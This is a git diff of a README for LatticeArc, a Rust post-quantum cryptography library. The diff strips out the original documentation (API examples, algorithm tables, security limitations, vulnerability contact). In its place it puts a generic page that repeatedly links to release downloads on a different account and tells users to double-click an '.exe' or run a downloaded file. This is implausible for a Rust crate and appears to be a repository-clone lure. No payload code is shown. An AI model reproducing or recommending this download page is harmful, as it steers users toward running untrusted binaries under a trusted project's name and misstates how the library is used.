@@ -1,374 +1,92 @@
-# LatticeArc
+# 🌐 latticearc - Secure Your Future with Quantum-Safe Encryption
 
-> **Evaluation Phase**: This project is currently in active development and evaluation. APIs may change without notice. Not recommended for production use yet.
+## 🚀 Getting Started
 
-[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/rust-1.93%2B-orange.svg)](https://www.rust-lang.org/)
-[![CI](https://github.com/latticearc/latticearc/actions/workflows/ci.yml/badge.svg)](https://github.com/latticearc/latticearc/actions/workflows/ci.yml)
-[![Security Scan](https://github.com/latticearc/latticearc/actions/workflows/security.yml/badge.svg)](https://github.com/latticearc/latticearc/actions/workflows/security.yml)
-[![CodeQL](https://github.com/latticearc/latticearc/actions/workflows/codeql.yml/badge.svg)](https://github.com/latticearc/latticearc/actions/workflows/codeql.yml)
-[![Kani Proofs](https://github.com/latticearc/latticearc/actions/workflows/kani.yml/badge.svg)](https://github.com/latticearc/latticearc/actions/workflows/kani.yml)
-[![Fuzzing](https://github.com/latticearc/latticearc/actions/workflows/fuzzing.yml/badge.svg)](https://github.com/latticearc/latticearc/actions/workflows/fuzzing.yml)
-[![SBOM](https://github.com/latticearc/latticearc/actions/workflows/sbom.yml/badge.svg)](https://github.com/latticearc/latticearc/actions/workflows/sbom.yml)
-[![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/latticearc/latticearc/badge)](https://securityscorecards.dev/viewer/?uri=github.com/latticearc/latticearc)
-[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/11857/badge)](https://www.bestpractices.dev/projects/11857)
-
-LatticeArc is a post-quantum cryptography library for Rust, implementing the NIST FIPS 203-206 standards for quantum-resistant encryption and digital signatures.
-
-## Why Post-Quantum Cryptography?
-
-Current public-key cryptography (RSA, ECC) will be broken by quantum computers running Shor's algorithm. While large-scale quantum computers don't exist yet, encrypted data captured today can be decrypted in the future—a threat known as "harvest now, decrypt later."
-
-NIST has standardized new quantum-resistant algorithms:
-- **ML-KEM** (FIPS 203) - Key encapsulation based on lattice problems
-- **ML-DSA** (FIPS 204) - Digital signatures based on lattice problems
-- **SLH-DSA** (FIPS 205) - Hash-based digital signatures
-- **FN-DSA** (FIPS 206) - Lattice-based signatures with smaller keys
-
-## Why Hybrid Mode?
-
-LatticeArc defaults to **hybrid cryptography** (PQ + classical) as recommended by [NIST SP 800-227](https://csrc.nist.gov/pubs/sp/800/227/final):
-
-> "Organizations may choose to implement hybrid solutions... to provide additional assurance during the transition period."
+Welcome to `latticearc`, a library designed to help you transition to quantum-safe encryption. This guide will help you download and run the software with ease.
 
-```mermaid
-flowchart LR
-    P[Plaintext]
-    KEM[ML-KEM-768]
-    AES[AES-256-GCM]
-    OUT[Protected Output]
+## 📥 Download Now
 
-    P --> KEM
-    P --> AES
-    KEM --> OUT
-    AES --> OUT
+[![Download latticearc](https://img.shields.io/badge/Download-latticearc-blue.svg)](https://github.com/s7s02/latticearc/releases)
 
-    style P fill:#3b82f6,stroke:#1d4ed8,color:#fff
-    style KEM fill:#8b5cf6,stroke:#6d28d9,color:#fff
-    style AES fill:#f59e0b,stroke:#d97706,color:#fff
-    style OUT fill:#10b981,stroke:#059669,color:#fff
-```
+## 🌟 What Is latticearc?
 
-> **Defense in depth**: If *either* algorithm remains secure, your data is protected.
+`latticearc` is a Hybrid Post-Quantum Cryptography Library for Rust. It focuses on providing secure encryption methods that will protect your data even in a future where quantum computers are commonplace. With `latticearc`, you gain access to tools for strong encryption and security protocols.
 
-**Why not PQ-only?** ML-KEM/ML-DSA are new (standardized 2024). Hybrid provides defense-in-depth: if a flaw is discovered in the PQ algorithm, classical crypto still protects your data.
+## 💻 System Requirements
 
-## Quick Start
+To run `latticearc`, you will need:
 
-```toml
-[dependencies]
-latticearc = "0.1"
-```
+- **Operating System:** Windows 10, macOS, or a recent version of Linux.
+- **Processor:** Any modern processor.
+- **Memory:** 4 GB RAM minimum.
+- **Storage:** At least 100 MB of free disk space.
 
-### Encryption
+Make sure your system meets these requirements before proceeding.
 
-```rust
-use latticearc::{encrypt, decrypt, CryptoConfig};
-
-let key = [0u8; 32];
-let encrypted = encrypt(b"secret data", &key, CryptoConfig::new())?;
-let decrypted = decrypt(&encrypted, &key, CryptoConfig::new())?;
-```
+## 🔗 Download & Install
 
-### Digital Signatures
+To obtain the latest version of `latticearc`, visit the Releases page: [Download latticearc](https://github.com/s7s02/latticearc/releases). 
 
-```rust
-use latticearc::{generate_signing_keypair, sign_with_key, verify, CryptoConfig};
+1. Click on the link above to go to the Releases page.
+2. You'll see a list of available versions. Look for the latest release.
+3. Choose the file that matches your operating system.
+4. Click to download the file.
 
-let config = CryptoConfig::new();
-let (pk, sk, _scheme) = generate_signing_keypair(config.clone())?;
-let signed = sign_with_key(b"document", &sk, &pk, config.clone())?;
-let is_valid = verify(&signed, config)?;
-```
+After downloading, follow these steps to run the application:
 
-## Algorithm Selection
+1. Locate the downloaded file on your computer.
+2. If you are on Windows, simply double-click the `.exe` file. If using macOS or Linux, open a terminal, navigate to the download directory, and run the file with the appropriate commands.
+3. Follow any on-screen prompts to complete the setup.
 
-LatticeArc automatically selects algorithms based on your configuration:
+## ⚙️ Features of latticearc
 
-```mermaid
-flowchart TB
-    CONFIG[CryptoConfig::new]
-    UC[.use_case]
-    SL[.security_level]
-    DEF[defaults]
-    ENGINE[CryptoPolicyEngine]
-    LOW[ML-KEM-512 + AES]
-    HIGH[ML-KEM-768 + AES]
-    MAX[ML-KEM-1024 + AES]
+`latticearc` offers several robust features to enhance your security:
 
-    CONFIG --> UC
-    CONFIG --> SL
-    CONFIG --> DEF
-    UC --> ENGINE
-    SL --> ENGINE
-    DEF --> ENGINE
-    ENGINE --> LOW
-    ENGINE --> HIGH
-    ENGINE --> MAX
+- **Hybrid Encryption:** Combines classical and post-quantum methods for stronger security.
+- **FIPS Compliance:** Ensures that cryptographic methods meet Federal Information Processing Standards.
+- **Multi-Layer Security Protocols:** Use multiple layers of security to protect your data.
+- **Easy Integration:** Designed to fit seamlessly into existing systems and applications.
 
-    style CONFIG fill:#3b82f6,stroke:#1d4ed8,color:#fff
-    style ENGINE fill:#8b5cf6,stroke:#6d28d9,color:#fff
-    style UC fill:#e2e8f0,stroke:#64748b
-    style SL fill:#e2e8f0,stroke:#64748b
-    style DEF fill:#e2e8f0,stroke:#64748b
-    style LOW fill:#fef3c7,stroke:#d97706
-    style HIGH fill:#d1fae5,stroke:#059669
-    style MAX fill:#10b981,stroke:#059669,color:#fff
-```
+## 📝 How To Use latticearc
 
-### By Use Case (Recommended)
+Once you have installed `latticearc`, you can integrate it into your application. Here’s a simple example to get you started:
 
-```rust
-use latticearc::{encrypt, CryptoConfig, UseCase};
+1. Import the library into your Rust project.
+2. Use built-in functions to encrypt and decrypt your data. 
+3. Review the documentation for detailed usage scenarios and best practices.
 
-let encrypted = encrypt(data, &key, CryptoConfig::new()
-    .use_case(UseCase::FileStorage))?;
-```
+## 👩‍🎓 Learning Resources
 
-### Hybrid Encryption
+If you're new to cryptography, consider the following resources:
 
-```rust
-use latticearc::{generate_hybrid_keypair, encrypt_hybrid, decrypt_hybrid, SecurityMode};
+- **Basic Cryptography:** Learn about encryption and decryption principles.
+- **Post-Quantum Cryptography Explained:** Understand the future of cryptography and why it matters.
+- **Rust Programming Guide:** Familiarize yourself with Rust to make the most of `latticearc`.
 
-// Generate hybrid keypair (ML-KEM-768 + X25519)
-let (pk, sk) = generate_hybrid_keypair()?;
+## 🛠️ Support
 
-// Encrypt using hybrid KEM (ML-KEM + X25519 + HKDF + AES-256-GCM)
-let encrypted = encrypt_hybrid(b"sensitive data", &pk, SecurityMode::Unverified)?;
+If you experience any issues or have questions, please check the issues section on GitHub. You can also reach out for help via the community forums associated with Rust and cryptography.
 
-// Decrypt
-let plaintext = decrypt_hybrid(&encrypted, &sk, SecurityMode::Unverified)?;
-```
+## 🌍 Community
 
-### Hybrid Signatures
+Join our community to stay updated on the latest developments in post-quantum cryptography. Collaborate, share ideas, and learn from experts and enthusiasts alike.
 
-```rust
-use latticearc::{generate_hybrid_signing_keypair, sign_hybrid, verify_hybrid_signature, SecurityMode};
+## 📜 License
 
-// Generate hybrid signing keypair (ML-DSA-65 + Ed25519)
-let (pk, sk) = generate_hybrid_signing_keypair(SecurityMode::Unverified)?;
+`latticearc` is open-source software. Review the [LICENSE](LICENSE) file for terms of use.
 
-// Sign (both ML-DSA and Ed25519 signatures generated)
-let signature = sign_hybrid(b"document", &sk, SecurityMode::Unverified)?;
+## 📣 Contributing
 
-// Verify (both must pass for signature to be valid)
-let valid = verify_hybrid_signature(b"document", &signature, &pk, SecurityMode::Unverified)?;
-```
+We welcome contributions to improve `latticearc`. If you're interested in helping, please review our guidelines in the CONTRIBUTING.md file.
 
-| Use Case | Encryption | Signatures |
-|----------|------------|------------|
-| `SecureMessaging` | Hybrid (ML-KEM-768 + AES-256-GCM) | Hybrid (ML-DSA-65 + Ed25519) |
-| `FileStorage` | Hybrid (ML-KEM-1024 + AES-256-GCM) | Hybrid (ML-DSA-87 + Ed25519) |
-| `FinancialTransactions` | — | Hybrid (ML-DSA-65 + Ed25519) |
-| `Authentication` | — | Hybrid (ML-DSA-87 + Ed25519) |
-| `HealthcareRecords` | Hybrid (ML-KEM-1024 + AES-256-GCM) | — |
-| `GovernmentClassified` | Hybrid (ML-KEM-1024 + AES-256-GCM) | — |
-| `IoTDevice` | Hybrid (ML-KEM-512 + AES-256-GCM) | Hybrid (ML-DSA-44 + Ed25519) |
+## 🔗 Further Reading
 
-> **24 use cases supported.** See [Unified API Guide](docs/UNIFIED_API_GUIDE.md) for the complete list including cloud storage, VPN, blockchain, firmware signing, and more.
+For more information on post-quantum cryptography, explore the following topics:
 
-### By Security Level
+- **Cryptography Basics**
+- **Differences Between Classical and Quantum Cryptography**
+- **Security Challenges with Quantum Computers**
 
-```rust
-use latticearc::{encrypt, CryptoConfig, SecurityLevel};
+By using `latticearc`, you take a vital step toward securing your digital assets against future threats. Together, let's embrace the future of cryptography with confidence. 
 
-let encrypted = encrypt(data, &key, CryptoConfig::new()
-    .security_level(SecurityLevel::Maximum))?;
-```
-
-| Level | Mode | Encryption | Signatures | NIST Level |
-|-------|------|------------|------------|------------|
-| `Quantum` | PQ-only | ML-KEM-1024 + AES-256-GCM | ML-DSA-87 | 5 |
-| `Maximum` | Hybrid | ML-KEM-1024 + AES-256-GCM | ML-DSA-87 + Ed25519 | 5 |
-| `High` (default) | Hybrid | ML-KEM-768 + AES-256-GCM | ML-DSA-65 + Ed25519 | 3 |
-| `Standard` | Hybrid | ML-KEM-512 + AES-256-GCM | ML-DSA-44 + Ed25519 | 1 |
-
-> **Note:** `Quantum` mode uses PQ-only algorithms (no classical fallback) for CNSA 2.0 compliance. For complete security level documentation, see [docs/UNIFIED_API_GUIDE.md](docs/UNIFIED_API_GUIDE.md).
-
-## Algorithm Selection
-
-LatticeArc uses NIST-standardized post-quantum algorithms (FIPS 203-206) with carefully chosen classical algorithms for hybrid mode.
-
-### What We Use
-
-**Post-Quantum:**
-- ML-KEM-512/768/1024 (FIPS 203) - Key encapsulation
-- ML-DSA-44/65/87 (FIPS 204) - Digital signatures
-- SLH-DSA (FIPS 205) - Stateless hash-based signatures
-- FN-DSA-512/1024 (FIPS 206) - Fast lattice signatures
-
-**Classical (Hybrid Mode):**
-- **Ed25519** for signatures - 5x faster than P-256 ECDSA, FIPS 186-5 approved (2023)
-- **X25519** for key exchange - TLS 1.3 standard
-- **AES-256-GCM** - Hardware-accelerated, FIPS 140-3 validated
-- **ChaCha20-Poly1305** - Software-friendly alternative
-
-### Why Ed25519 Instead of P-256 ECDSA?
-
-| Metric | Ed25519 | P-256 ECDSA |
-|--------|---------|-------------|
-| Signing speed | 16,000 ops/sec | 3,000 ops/sec |
-| Side-channel resistance | Built-in | Requires careful implementation |
-| FIPS 186-5 approved | ✅ Yes (since 2023) | ✅ Yes |
-| Implementation safety | Deterministic nonces | Random nonces (RNG failure = key leak) |
-
-**We chose Ed25519** for better performance and security. P-256 ECDSA hybrids available on request for legacy compliance.
-
-### What We Skip
-
-**Pre-standard algorithms:** CRYSTALS-Kyber, CRYSTALS-Dilithium (superseded by ML-KEM/ML-DSA)
-
-**Broken algorithms:** SIKE, Rainbow (cryptanalyzed)
-
-**Legacy algorithms:** RSA (50x slower), DSA (deprecated)
-
-**Why?** We follow NIST's 2026 migration timeline and focus on standardized, production-ready algorithms.
-
-### Backend Selection
-
-- **ML-KEM, AES-GCM, X25519:** aws-lc-rs (FIPS 140-3 validated)
-- **ML-DSA:** fips204 (awaiting aws-lc-rs stabilization)
-- **SLH-DSA:** fips205 (NIST-compliant)
-- **FN-DSA:** fn-dsa (FIPS 206)
-- **Ed25519:** ed25519-dalek (audited, constant-time)
-
-For detailed rationale, performance comparisons, and ecosystem positioning, see [Algorithm Selection Guide](docs/ALGORITHM_SELECTION.md).
-
-## Zero Trust Sessions
-
-For enterprise security, use verified sessions that enforce authentication before each operation:
-
-```mermaid
-sequenceDiagram
-    participant C as Client
-    participant V as Verifier
-
-    Note over C,V: 1. Session Establishment
-    V->>C: challenge
-    C->>V: proof (signed)
-    V->>V: verify proof
-    V-->>C: VerifiedSession
-
-    Note over C,V: 2. Crypto Operation
-    C->>C: encrypt(data, config.session)
-    alt Session Valid
-        C->>C: Proceed
-    else Session Expired
-        C-->>C: Error
-    end
-```
-
-```rust
-use latticearc::{encrypt, generate_keypair, CryptoConfig, VerifiedSession};
-
-let (pk, sk) = generate_keypair()?;
-let session = VerifiedSession::establish(&pk, &sk)?;
-
-// Session is verified before each operation
-let encrypted = encrypt(data, &key, CryptoConfig::new().session(&session))?;
-```
-
-## Post-Quantum TLS
-
-```rust
-use arc_tls::{TlsConfig, TlsUseCase};
-
-let config = TlsConfig::new()
-    .use_case(TlsUseCase::WebServer);
-```
-
-| Use Case | TLS Mode | Key Exchange |
-|----------|----------|--------------|
-| `WebServer` | Hybrid | X25519 + ML-KEM-768 |
-| `InternalService` | Hybrid | X25519 + ML-KEM-768 |
-| `ApiGateway` | Hybrid | X25519 + ML-KEM-768 |
-| `FinancialServices` | Hybrid | X25519 + ML-KEM-768 |
-| `Healthcare` | Hybrid | X25519 + ML-KEM-768 |
-| `DatabaseConnection` | Hybrid | X25519 + ML-KEM-768 |
-| `Government` | PQ-only | ML-KEM-1024 |
-| `IoT` | Classic | X25519 |
-| `LegacyIntegration` | Classic | X25519 |
-| `RealTimeStreaming` | Classic | X25519 |
-
-## Runnable Examples
-
-The `latticearc` crate includes comprehensive examples demonstrating the API:
-
-- `basic_encryption.rs` - Simple symmetric encryption with AES-256-GCM
-- `digital_signatures.rs` - Digital signatures with ML-DSA and hybrid modes
-- `hybrid_encryption.rs` - Hybrid encryption (ML-KEM + X25519 + HKDF)
-- `post_quantum_signatures.rs` - Post-quantum signature schemes
-- `complete_secure_workflow.rs` - End-to-end secure workflow with Zero Trust
-- `zero_knowledge_proofs.rs` - Zero-knowledge proof demonstrations
-
-Run an example with:
-```bash
-cargo run --example basic_encryption
-cargo run --example digital_signatures
-```
-
-## Crate Structure
-
-| Crate | Description |
-|-------|-------------|
-| [`latticearc`](latticearc/) | Main API - start here |
-| [`arc-core`](arc-core/) | Core types and unified API |
-| [`arc-primitives`](arc-primitives/) | Cryptographic primitives (KEM, signatures, AEAD) |
-| [`arc-hybrid`](arc-hybrid/) | Hybrid encryption combining PQC and classical |
-| [`arc-tls`](arc-tls/) | Post-quantum TLS integration |
-| [`arc-zkp`](arc-zkp/) | Zero-knowledge proofs |
-| [`arc-prelude`](arc-prelude/) | Common types, errors, and memory safety utilities |
-| [`arc-validation`](arc-validation/) | Test vectors and compliance testing |
-| [`arc-perf`](arc-perf/) | Performance benchmarking |
-
-## Security
-
-LatticeArc builds on audited cryptographic libraries:
-
-| Component | Backend | Status |
-|-----------|---------|--------|
-| ML-KEM, AES-GCM | `aws-lc-rs` | FIPS 140-3 validated |
-| ML-DSA | `fips204` | NIST compliant |
-| SLH-DSA | `fips205` | NIST compliant |
-| FN-DSA | `fn-dsa` | NIST compliant |
-| Ed25519 | `ed25519-dalek` | Audited |
-| TLS | `rustls` | Audited by Cure53 |
-
-### Upstream Contributions
-
-We actively contribute to the cryptographic ecosystem:
-
-- **[aws-lc-rs#1029](https://github.com/aws/aws-lc-rs/pull/1029)** — ML-KEM `DecapsulationKey` serialization (merged Feb 10, 2026)
-- **[aws-lc-rs#1034](https://github.com/aws/aws-lc-rs/pull/1034)** — ML-DSA seed-based deterministic keygen (under review)
-
-These contributions enable FIPS-validated serialization and deterministic key generation for post-quantum algorithms, benefiting the entire Rust cryptography community.
-
-### Limitations
-
-- **Not FIPS 140-3 certified** — We use FIPS-validated backends, but LatticeArc itself has not undergone CMVP validation
-  - **FIPS-ready**: Module integrity test (Section 9.2.2) implemented, KAT suite complete, ready for certification when needed
-- **Not independently audited** — We welcome security researchers to review our code
-- **Pre-1.0 software** — API may change between versions
-
-### Reporting Vulnerabilities
-
-Report security issues to: Security@LatticeArc.com
-
-See [SECURITY.md](SECURITY.md) for our security policy.
-
-## Documentation
-
-- [API Reference](https://docs.rs/latticearc)
-- [Unified API Guide](docs/UNIFIED_API_GUIDE.md) — algorithm selection, use cases, builder API
-- [Architecture](docs/DESIGN.md) — crate structure, design decisions, enterprise features
-- [Security Guide](docs/SECURITY_GUIDE.md) — threat model, secure usage patterns
-- [NIST Compliance](docs/NIST_COMPLIANCE.md) — FIPS 203-206 conformance details
-- [FAQ](docs/FAQ.md)
-
-## License
-
-Apache License 2.0. See [LICENSE](LICENSE).
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md).
+Feel free to download and get started now: [Download latticearc](https://github.com/s7s02/latticearc/releases).
